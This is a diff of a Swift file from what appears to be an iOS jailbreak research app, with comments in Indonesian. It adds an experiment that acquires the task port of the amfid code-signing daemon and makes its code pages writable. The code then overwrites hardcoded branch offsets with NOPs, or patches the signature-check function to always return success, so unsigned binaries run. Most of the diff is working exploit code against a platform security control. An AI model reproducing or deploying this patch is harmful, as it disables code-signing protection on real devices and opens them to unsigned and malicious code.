@@ -4906,26 +4906,33 @@ struct AMFIExperimentView: View {
 
     // MARK: - Exp 84: amfid Patch via Physmap
 
-    /// Exp 84: Patch amfid userspace daemon untuk skip signature check.
-    /// zone_require_ro memblokir write ke proc_ro (Exp 83 gagal).
-    /// amfid __TEXT bukan zone_require_ro — bisa di-patch via physmap.
-    /// Tidak perlu RC/launchd — pure KRW.
+    /// Exp 84 v2: Patch amfid via launchd RC + task_for_pid.
+    /// Hardcoded offsets dari on-device analysis (Dump amfid).
+    /// Semua 13 BL+CBNZ W0 mengarah ke fungsi yang sama (0x10001c830) = signature check.
+    /// Patch: NOP semua CBNZ W0 → amfid selalu lanjut (skip error branch).
     private func runExp84AmfidPatch() {
         isRunning = true
         runningLabel = "amfid"
-        guard mgr.dsready, PhysmapConstants.isVerified else {
+        guard mgr.rcready else {
             isRunning = false
             runningLabel = ""
             return
         }
-        DispatchQueue.global(qos: .userInitiated).async {
-            let result = self.expAmfidPatch()
+
+        #if !DISABLE_REMOTECALL
+        root.executeAsRoot(operation: "exp84_amfid_patch") { rc in
+            let result = self.expAmfidPatchV2(rc: rc)
             DispatchQueue.main.async {
                 self.results.insert(result, at: 0)
                 self.isRunning = false
                 self.runningLabel = ""
             }
+            return (result.success, result.detail.prefix(80).description, 0)
         }
+        #else
+        isRunning = false
+        runningLabel = ""
+        #endif
     }
 
     // MARK: - Dump amfid binary
@@ -6983,23 +6990,324 @@ struct AMFIExperimentView: View {
 
     // MARK: - Exp 84: amfid Patch via Physmap
 
-    /// Patch amfid userspace daemon untuk skip signature check.
+    // MARK: - Exp 84 v2: amfid Patch via task_for_pid + mach_vm_write
+
+    /// Exp 84 v2: Patch amfid dari launchd RC via task_for_pid.
+    /// Hardcoded offsets dari on-device analysis.
+    /// Semua 13 BL+CBNZ W0 target fungsi yang sama = signature check.
+    /// Patch: NOP semua CBNZ W0 → amfid skip error branch → always allow.
     ///
-    /// Background:
-    ///   - proc_ro di iOS 18 di-protect zone_require_ro (hardware RO) → Exp 83 gagal
-    ///   - amfid adalah daemon yang memvalidasi code signature via XPC dari kernel
-    ///   - amfid __TEXT ada di userspace memory (bukan zone_require_ro)
-    ///   - Kita bisa baca physical address amfid text via physmap, lalu patch instruksi
-    ///
-    /// Strategi:
-    ///   1. Cari amfid proc → baca textvp (vnode binary amfid)
-    ///   2. Baca amfid task → vm_map → cari region __TEXT amfid
-    ///   3. Scan amfid __TEXT untuk pola instruksi signature check
-    ///   4. Patch: ganti instruksi check dengan MOV W0, #0 + RET (always allow)
+    /// Flow:
+    ///   1. Dari launchd RC, panggil task_for_pid(amfid_pid) → amfid task port
+    ///   2. mach_vm_protect: make amfid __TEXT writable (VM_PROT_READ|WRITE|EXECUTE)
+    ///   3. mach_vm_write: tulis NOP (0xD503201F) ke setiap CBNZ offset
+    ///   4. Verify: mach_vm_read kembali untuk konfirmasi
     ///   5. Test spawn binary unsigned
-    ///
-    /// Alternatif lebih aman: patch return value saja (NOP + MOV W0, #0)
-    ///
+    #if !DISABLE_REMOTECALL
+    private func expAmfidPatchV2(rc: RemoteCall) -> ExperimentResult {
+        let expName = "amfid Patch v2 (Exp 84)"
+        var detail = "Experiment 84 v2: amfid Patch via task_for_pid\n"
+        detail += "================================================\n\n"
+
+        let mem = rc.trojanMem
+        let mgr = dspmgr.shared
+
+        // ── Hardcoded patch offsets (dari on-device analysis) ─────────
+        // amfid __TEXT base: 0x100000000 (in-binary), runtime: 0x16cd60000
+        // Semua offset relatif dari runtime __TEXT base
+        let amfidTextOffsets: [UInt64] = [
+            0x274c, 0x2764, 0x2c68, 0x2d68, 0x33c0,
+            0x348c, 0x372c, 0x3a9c, 0x3f24, 0x4164,
+            0x41ec, 0x4284, 0x431c,
+        ]
+        let NOP: UInt32 = 0xD503201F
+
+        // ── Step 1: Find amfid PID ───────────────────────────────────
+        detail += "=== Step 1: Find amfid ===\n"
+        let amfidProc = mgr.findProc(name: "amfid")
+        guard amfidProc != 0 else {
+            detail += "❌ amfid tidak ditemukan.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
+        detail += "amfid PID: \(amfidPid)\n\n"
+
+        // ── Step 2: task_for_pid dari launchd ────────────────────────
+        detail += "=== Step 2: task_for_pid(\(amfidPid)) ===\n"
+
+        // task_for_pid(mach_task_self(), pid, &task_port)
+        let taskSelf = RootExecutor.rcall(rc, "mach_task_self")
+        let taskPortAddr = mem + 0x1A00
+        rc[taskPortAddr].setValue32(0)
+
+        let tfpRet = RootExecutor.rcall(rc, "task_for_pid", taskSelf, UInt64(amfidPid), taskPortAddr)
+        let amfidTaskPort = rc[taskPortAddr].value32()
+        detail += "task_for_pid ret: \(tfpRet) (0=success)\n"
+        detail += "amfid task port: \(amfidTaskPort)\n"
+
+        guard tfpRet == 0 && amfidTaskPort != 0 else {
+            detail += "❌ task_for_pid gagal.\n"
+            detail += "Kemungkinan: launchd tidak punya hak task_for_pid ke amfid.\n\n"
+
+            // Fallback: coba langsung write via mach_vm_write dengan task port dari kernel
+            detail += "=== Fallback: Direct KRW patch amfid memory ===\n"
+            detail += "Coba baca amfid __TEXT langsung via KRW...\n"
+
+            // amfid runtime text base dari Exp 84 Step 2
+            let amfidRuntimeText: UInt64 = 0x16cd60000
+            // Coba baca instruksi pertama di offset [0]
+            let testAddr = amfidRuntimeText + amfidTextOffsets[0]
+            let testVal = ds_kread32_safe(testAddr)
+            detail += "Read amfid text 0x\(String(format: "%llx", testAddr)): 0x\(String(format: "%08x", testVal))\n"
+
+            if testVal == 0 {
+                detail += "❌ Tidak bisa baca amfid text via KRW (userspace VA).\n"
+                detail += "KRW hanya bisa akses kernel VA, bukan userspace VA amfid.\n\n"
+                detail += "=== Alternatif yang tersisa ===\n"
+                detail += "1. Patch amfid binary on-disk: tulis NOP ke /usr/libexec/amfid\n"
+                detail += "   Lalu kill amfid → launchd restart amfid → patched version jalan\n"
+                detail += "2. Atau: patch fungsi target (0x10001c830) di amfid\n"
+                detail += "   Ganti prologue fungsi dengan MOV W0,#0 + RET\n"
+            }
+
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        detail += "✅ task_for_pid berhasil! amfid task port = \(amfidTaskPort)\n\n"
+
+        // ── Step 3: Cari amfid __TEXT runtime base ───────────────────
+        detail += "=== Step 3: Find amfid __TEXT runtime base ===\n"
+
+        // Baca region info via mach_vm_region untuk konfirmasi base address
+        // Atau pakai hardcoded dari Exp 84 Step 2: 0x16cd60000
+        // Tapi base bisa berubah tiap launch (ASLR). Cari via mach_vm_region.
+
+        // mach_vm_region_recurse(task, &addr, &size, &depth, &info, &infoCnt)
+        // Lebih simpel: coba baca Mach-O magic di beberapa candidate base
+        let candidateBases: [UInt64] = [
+            0x16cd60000,  // dari Exp 84 sebelumnya
+            0x100000000,  // non-ASLR base
+        ]
+
+        var amfidTextBase: UInt64 = 0
+        let readBuf = mem + 0x1C00
+        let readSizeAddr = mem + 0x1D00
+
+        for base in candidateBases {
+            // mach_vm_read_overwrite(task, address, size, data, &dataCnt)
+            rc[readSizeAddr].setValue64(4)
+            let readRet = RootExecutor.rcall(rc, "mach_vm_read_overwrite",
+                                            UInt64(amfidTaskPort), base, 4,
+                                            readBuf, readSizeAddr)
+            if readRet == 0 {
+                let magic = rc[readBuf].value32()
+                detail += "  0x\(String(format: "%llx", base)): magic=0x\(String(format: "%08x", magic))\n"
+                if magic == 0xFEEDFACF {
+                    amfidTextBase = base
+                    detail += "  ✅ Mach-O header found!\n"
+                    break
+                }
+            } else {
+                detail += "  0x\(String(format: "%llx", base)): read failed (ret=\(readRet))\n"
+            }
+        }
+
+        // Jika hardcoded bases gagal, scan via mach_vm_region
+        if amfidTextBase == 0 {
+            detail += "\nHardcoded bases gagal, scanning via mach_vm_region...\n"
+            // Scan dari 0x100000000 ke atas
+            let addrPtr = mem + 0x1E00
+            let sizePtr = mem + 0x1E08
+            let infoPtr = mem + 0x1E10
+            let infoCntPtr = mem + 0x1E80
+            let depthPtr = mem + 0x1E88
+
+            var scanAddr: UInt64 = 0x100000000
+            for _ in 0..<64 {
+                rc[addrPtr].setValue64(scanAddr)
+                rc[sizePtr].setValue64(0)
+                rc[depthPtr].setValue32(0)
+                rc[infoCntPtr].setValue32(15) // VM_REGION_SUBMAP_SHORT_INFO_COUNT_64
+
+                let regionRet = RootExecutor.rcall(rc, "mach_vm_region_recurse",
+                                                   UInt64(amfidTaskPort),
+                                                   addrPtr, sizePtr,
+                                                   depthPtr, infoPtr, infoCntPtr)
+                if regionRet != 0 { break }
+
+                let regionAddr = rc[addrPtr].value64()
+                let regionSize = rc[sizePtr].value64()
+
+                // Try read Mach-O magic
+                rc[readSizeAddr].setValue64(4)
+                let rr = RootExecutor.rcall(rc, "mach_vm_read_overwrite",
+                                           UInt64(amfidTaskPort), regionAddr, 4,
+                                           readBuf, readSizeAddr)
+                if rr == 0 {
+                    let magic = rc[readBuf].value32()
+                    if magic == 0xFEEDFACF {
+                        amfidTextBase = regionAddr
+                        detail += "  ✅ Found at 0x\(String(format: "%llx", regionAddr)) (size=0x\(String(format: "%llx", regionSize)))\n"
+                        break
+                    }
+                }
+
+                scanAddr = regionAddr + regionSize
+                if scanAddr > 0x300000000 { break }
+            }
+        }
+
+        guard amfidTextBase != 0 else {
+            detail += "❌ amfid __TEXT base tidak ditemukan.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        detail += "amfid __TEXT base: 0x\(String(format: "%llx", amfidTextBase))\n\n"
+
+        // ── Step 4: mach_vm_protect — make writable ──────────────────
+        detail += "=== Step 4: mach_vm_protect (make writable) ===\n"
+
+        // VM_PROT_READ|WRITE|EXECUTE = 7, set_maximum = false
+        let protRet = RootExecutor.rcall(rc, "mach_vm_protect",
+                                         UInt64(amfidTaskPort),
+                                         amfidTextBase, 0x24000, // size of __TEXT
+                                         0, 7) // VM_PROT_ALL = 7
+        detail += "mach_vm_protect ret: \(protRet)\n"
+
+        if protRet != 0 {
+            detail += "⚠️ mach_vm_protect gagal (ret=\(protRet)) — coba write langsung...\n"
+            detail += "Beberapa iOS version allow write tanpa explicit protect change.\n\n"
+        } else {
+            detail += "✅ __TEXT sekarang writable!\n\n"
+        }
+
+        // ── Step 5: Patch CBNZ W0 → NOP ─────────────────────────────
+        detail += "=== Step 5: Patch CBNZ W0 → NOP ===\n"
+
+        var patchedCount = 0
+        var failedCount = 0
+
+        for (i, offset) in amfidTextOffsets.enumerated() {
+            let patchAddr = amfidTextBase + offset
+
+            // Read original instruction first
+            rc[readSizeAddr].setValue64(4)
+            let readRet = RootExecutor.rcall(rc, "mach_vm_read_overwrite",
+                                            UInt64(amfidTaskPort), patchAddr, 4,
+                                            readBuf, readSizeAddr)
+            let originalInstr = rc[readBuf].value32()
+
+            // Verify it's CBNZ W0 (0x35xxxxxx with Rt=0)
+            let isCBNZ = (originalInstr >> 24) == 0x35 && (originalInstr & 0x1F) == 0
+            if !isCBNZ && readRet == 0 {
+                detail += "  [\(i)] +0x\(String(format: "%x", offset)): 0x\(String(format: "%08x", originalInstr)) — skip (bukan CBNZ W0)\n"
+                continue
+            }
+
+            // Write NOP via mach_vm_write
+            // mach_vm_write(task, address, data, dataCnt)
+            rc[mem + 0x2000].setValue32(NOP)
+            let writeRet = RootExecutor.rcall(rc, "mach_vm_write",
+                                             UInt64(amfidTaskPort), patchAddr,
+                                             mem + 0x2000, 4)
+
+            if writeRet == 0 {
+                // Verify
+                rc[readSizeAddr].setValue64(4)
+                RootExecutor.rcall(rc, "mach_vm_read_overwrite",
+                                  UInt64(amfidTaskPort), patchAddr, 4,
+                                  readBuf, readSizeAddr)
+                let afterInstr = rc[readBuf].value32()
+
+                if afterInstr == NOP {
+                    patchedCount += 1
+                    if patchedCount <= 5 {
+                        detail += "  ✅ [\(i)] +0x\(String(format: "%x", offset)): 0x\(String(format: "%08x", originalInstr)) → NOP\n"
+                    }
+                } else {
+                    failedCount += 1
+                    detail += "  ❌ [\(i)] +0x\(String(format: "%x", offset)): write OK but verify failed (got 0x\(String(format: "%08x", afterInstr)))\n"
+                }
+            } else {
+                failedCount += 1
+                if failedCount <= 3 {
+                    detail += "  ❌ [\(i)] +0x\(String(format: "%x", offset)): mach_vm_write failed (ret=\(writeRet))\n"
+                }
+            }
+        }
+
+        if patchedCount > 5 {
+            detail += "  ... dan \(patchedCount - 5) lainnya\n"
+        }
+
+        detail += "\nPatched: \(patchedCount)/\(amfidTextOffsets.count)\n"
+        detail += "Failed: \(failedCount)\n\n"
+
+        // ── Step 6: Jika patch gagal, coba patch fungsi target langsung ──
+        if patchedCount == 0 {
+            detail += "=== Fallback: Patch fungsi signature check ===\n"
+            // Fungsi di 0x10001c830 (offset +0x1c830 dari __TEXT base)
+            // Patch prologue: MOV W0, #0 (0x52800000) + RET (0xD65F03C0)
+            let sigCheckOffset: UInt64 = 0x1c830
+            let sigCheckAddr = amfidTextBase + sigCheckOffset
+
+            detail += "Target: 0x\(String(format: "%llx", sigCheckAddr)) (signature check fn)\n"
+
+            // Write MOV W0, #0 + RET (8 bytes)
+            rc[mem + 0x2000].setValue32(0x52800000) // MOV W0, #0
+            rc[mem + 0x2004].setValue32(0xD65F03C0) // RET
+
+            let writeRet2 = RootExecutor.rcall(rc, "mach_vm_write",
+                                              UInt64(amfidTaskPort), sigCheckAddr,
+                                              mem + 0x2000, 8)
+            detail += "mach_vm_write(MOV W0,#0 + RET): ret=\(writeRet2)\n"
+
+            if writeRet2 == 0 {
+                // Verify
+                rc[readSizeAddr].setValue64(8)
+                RootExecutor.rcall(rc, "mach_vm_read_overwrite",
+                                  UInt64(amfidTaskPort), sigCheckAddr, 8,
+                                  readBuf, readSizeAddr)
+                let v0 = rc[readBuf].value32()
+                let v1 = rc[readBuf + 4].value32()
+                detail += "Verify: 0x\(String(format: "%08x", v0)) 0x\(String(format: "%08x", v1))\n"
+
+                if v0 == 0x52800000 && v1 == 0xD65F03C0 {
+                    detail += "✅ Signature check function patched! (always return 0)\n"
+                    patchedCount = 1
+                } else {
+                    detail += "❌ Verify failed.\n"
+                }
+            }
+        }
+
+        // ── Step 7: Result ────────────────────────────────────────────
+        detail += "\n=== RESULT ===\n"
+        if patchedCount > 0 {
+            detail += "🎉🎉🎉 amfid PATCHED! 🎉🎉🎉\n\n"
+            detail += "amfid sekarang akan skip signature check.\n"
+            detail += "Semua binary dianggap valid oleh amfid.\n\n"
+            detail += "→ Tap ④ Test Binary Spawn untuk verifikasi!\n"
+            detail += "→ Jika spawn berhasil = FULL JAILBREAK ACHIEVED!\n\n"
+            detail += "⚠️ Patch hilang jika amfid restart.\n"
+            detail += "⚠️ Jangan kill amfid atau respring sebelum test.\n"
+        } else {
+            detail += "❌ Semua patch gagal.\n\n"
+            detail += "Kemungkinan:\n"
+            detail += "  1. task_for_pid berhasil tapi mach_vm_write di-block\n"
+            detail += "  2. W^X enforcement di iOS 18 (code signing on pages)\n"
+            detail += "  3. amfid text pages di-protect APRR/PPL\n\n"
+            detail += "Jalur terakhir: patch amfid binary on-disk\n"
+            detail += "  → tulis NOP ke /usr/libexec/amfid file\n"
+            detail += "  → kill amfid → launchd restart → patched version jalan\n"
+        }
+
+        return ExperimentResult(name: expName, success: patchedCount > 0, detail: detail, timestamp: Date())
+    }
+    #endif
+
+    /// Patch amfid via physmap (v1 — fallback jika task_for_pid gagal)
     /// Target fungsi di amfid (iOS 18):
     ///   - `_MISValidateSignatureAndCopyInfo` — return 0 = valid
     ///   - `_amfi_check_dyld_policy_self` — return 0 = allow
